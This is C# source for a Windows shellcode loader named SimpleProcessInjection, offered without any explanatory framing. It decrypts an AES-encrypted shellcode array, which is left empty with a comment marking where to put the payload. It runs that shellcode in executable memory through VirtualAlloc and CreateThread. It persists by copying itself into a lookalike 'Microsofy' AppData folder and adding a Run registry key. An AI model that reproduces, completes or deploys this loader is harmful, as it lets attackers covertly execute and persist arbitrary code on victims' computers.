using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SimpleProcessInjection
{
    internal class Program
    {
        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public const uint commit = 0x1000;
        public const uint reserve = 0x2000;
        public const uint erw = 0x40;
        public const uint infini = 0xFFFFFFFF;
        static void Main(string[] args)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;

            byte[] Key = Convert.FromBase64String("UWvdzxNvawefjcAUkEQHeq==");
            byte[] IV = Convert.FromBase64String("WUcLtUFSRczMSaEHrdBBRD==");

            byte[] testy = new byte[] { };//here shellcode AES encrypted
            byte[] chelly = AESDecrypt(testy, Key, IV);

            try
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string appFolderPath = Path.Combine(appDataPath, "Microsofy");
                string exePath = Path.Combine(appFolderPath, "SimpleProcessInjection.exe");


                if (!Directory.Exists(appFolderPath))
                {
                    Directory.CreateDirectory(appFolderPath);
                }
                File.Copy(Assembly.GetExecutingAssembly().Location, exePath, true);

                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rkApp.SetValue("SimpleProcessInjection", exePath);
                rkApp.Close();

            }
            catch
            {
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            }

            IntPtr advir = VirtualAlloc(IntPtr.Zero, (uint)chelly.Length, commit | reserve, erw);

            Marshal.Copy(chelly, 0, advir, chelly.Length);

            IntPtr th = CreateThread(IntPtr.Zero, 0, advir, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(th, infini);

        }

        private static byte[] AESDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecrypt(CEncryptedShell, decryptor);
                }
            }
        }
        private static byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}
